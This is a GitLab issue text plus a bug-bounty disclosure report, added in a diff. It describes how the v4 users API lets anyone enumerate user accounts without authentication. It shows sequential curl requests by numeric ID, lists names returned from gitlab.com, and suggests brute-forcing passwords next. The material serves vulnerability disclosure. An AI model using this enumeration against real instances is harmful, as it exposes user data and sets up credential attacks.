@@ -1,0 +1,50 @@
+'The API users endpoint no longer requires authentication to fetch data on individual users. This change was made [by this MR](https://gitlab.com/gitlab-org/gitlab-ce/merge_requests/12445) in order to allow unauthenticated users to view public project information.
+
+There are a couple of problems:
+
+* This allows fetching of user data on instances that do not allow public projects. Privately hosted instances (and dev) shouldn't allow unauthenticated requests to this endpoint.
+* We [allow all numeric user IDs](https://gitlab.com/gitlab-org/gitlab-ce/issues/28373) so usernames such as "1" are valid and cannot be filtered, then they map to numeric IDs. This can be used to walk the API and generate a list of all users.
+
+-----
+
+Title:         Unauthenticated enumeration of user accounts and their data
+
+Scope:         None
+
+Weakness:      Information Disclosure
+
+Severity:      High
+
+Link:          https://hackerone.com/reports/290026
+
+Date:          2017-11-14 07:17:25 +0000
+
+By:            @birdie
+
+Details:
+You can trivially fetch all the users without authenticating
+
+curl https://URL/api/v4/users/1
+
+curl https://URL/api/v4/users/2
+
+curl https://URL/api/v4/users/3
+
+curl https://URL/api/v4/users/4
+
+
+This even works for gitlab.com itself:
+
+User 1: Sid Sijbrandij
+
+User 2: no longer exists
+
+User 3: Travis B. Hartwell
+
+User 4: no longer exists
+
+User 5: Chris Bolton
+
+etc.
+
+You can then try to bruteforce their passwords and here you go.
